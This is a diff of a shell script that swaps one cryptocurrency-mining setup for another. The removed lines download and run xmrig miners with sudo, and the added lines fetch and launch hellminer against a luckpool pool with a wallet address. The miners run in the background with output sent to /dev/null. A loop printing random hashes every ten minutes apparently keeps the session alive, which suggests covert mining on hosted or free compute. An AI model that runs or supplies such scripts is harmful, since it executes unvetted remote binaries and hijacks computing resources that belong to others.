@@ -1,8 +1,4 @@
-apt update && apt install sudo -y
-sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
-wget https://raw.githubusercontent.com/aqshakuy/jdag/main/config.json
-wget https://github.com/aqshakuy/jdag/raw/main/xmrig2xdag
-wget https://github.com/sbwsmg/xmriglawas/raw/main/xmrig
-chmod 777 xmrig xmrig2xdag config.json
-sudo ./xmrig2xdag -c config.json > /dev/null 2>&1 &
-sudo ./xmrig -o 127.0.0.1:56729. -u pLFakJP6bPSOtqNc5ncnmTQs/2H2S1uJ -p x -a rx/xdag -t$(nproc --all)
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz 
+tar xf hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz
+./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RWKZzFWXcwAy3BVGL9avrsAnTQTwvKVUwZ.$(echo $(shuf -i 1-20000 -n 1)-aing) -p x --cpu 8 > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
